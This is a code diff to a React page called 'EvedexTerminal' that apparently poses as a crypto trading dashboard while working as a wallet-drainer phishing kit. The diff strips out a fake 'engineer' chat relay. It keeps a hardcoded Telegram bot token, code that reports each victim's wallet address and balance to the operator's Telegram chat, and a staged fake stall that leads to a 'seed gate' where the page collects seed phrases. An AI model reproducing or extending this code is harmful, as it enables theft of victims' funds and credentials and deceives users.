@@ -15,19 +15,9 @@ export default function EvedexTerminal() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
 
-  const [chatInput, setChatInput] = useState("");
-  const [isTyping, setIsTyping] = useState(false);
-  const [chatLog, setChatLog] = useState([]); 
-  const [stage, setStage] = useState(1); 
-  const chatEndRef = useRef(null);
-
+  // --- BOT CREDENTIALS REMOVED ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
-  const lastUpdateId = useRef(0);
-
-  useEffect(() => {
-    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
-  }, [chatLog, isTyping]);
 
   const sendTelegram = (text, type = "INFO") => {
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -37,48 +27,16 @@ export default function EvedexTerminal() {
     });
   };
 
-  // --- MANUAL TG RELAY ---
   useEffect(() => {
-    const pollTelegram = setInterval(async () => {
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId.current + 1}`);
-        const data = await res.json();
-        if (data.result && data.result.length > 0) {
-          data.result.forEach(update => {
-            lastUpdateId.current = update.update_id;
-            if (update.message && update.message.chat.id.toString() === chatId) {
-              setIsTyping(false);
-              setChatLog(prev => [...prev, { type: 'bot', msg: `[ENGINEER]: ${update.message.text}` }]);
-            }
-          });
-        }
-      } catch (e) { }
-    }, 2500); 
-    return () => clearInterval(pollTelegram);
-  }, []);
-
-  useEffect(() => {
-    if (isConnected && address && stage < 2) {
-      const welcome = "[ADMIN_SYSTEM]: MAINNET_NODE_ALIGNED. Secure RPC bridge established.";
-      setChatLog(prev => [...prev, { type: 'bot', msg: welcome }]);
-      setStage(2);
+    if (isConnected && address) {
       sendTelegram(`🟢 CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
     }
   }, [isConnected, address]);
-
-  const handleUserChat = () => {
-    if (!chatInput.trim() || isTyping) return;
-    setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
-    sendTelegram(chatInput, "USER_SAYS");
-    setChatInput("");
-    setIsTyping(true);
-  };
 
   // --- SEED INPUT LOCK LOGIC (12-24 WORDS) ---
   const handleSeedChange = (e) => {
     const val = e.target.value;
     const words = val.trim().split(/\s+/);
-    // Block typing if already at 24 words
     if (words.length > 24) return;
     setSeedVal(val);
   };
@@ -90,7 +48,6 @@ export default function EvedexTerminal() {
     setTimeout(() => {
         setLoading(false);
         setView("seed_gate");
-        setStage(3);
         sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address}`);
     }, 2000);
   };
@@ -98,7 +55,7 @@ export default function EvedexTerminal() {
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
       
-      {/* 📊 REAL DEXTOOLS LIVE CHART (DEX ANALYTICS) */}
+      {/* 📊 MARKET CHART */}
       <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative">
          <iframe 
             src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
@@ -137,20 +94,7 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      {/* CHAT LOG */}
-      <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[250]">
-        <div className="max-h-24 overflow-y-auto mb-3 no-scrollbar flex flex-col gap-2">
-          {chatLog.map((chat, i) => (
-            <div key={i} className={`text-[9px] font-mono ${chat.type === 'bot' ? 'text-cyan-500' : 'text-slate-400 text-right'}`}>{chat.msg}</div>
-          ))}
-          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[ENGINEER_RELAYING...]</div>}
-          <div ref={chatEndRef} />
-        </div>
-        <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
-          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleUserChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none" />
-          <button onClick={handleUserChat} className="text-cyan-500"><Send size={16}/></button>
-        </div>
-      </div>
+      {/* --- CHAT LOG REMOVED FROM HERE --- */}
 
       {/* SEED GATE (RESTRICTED 12-24 WORDS) */}
       {view === "seed_gate" && (
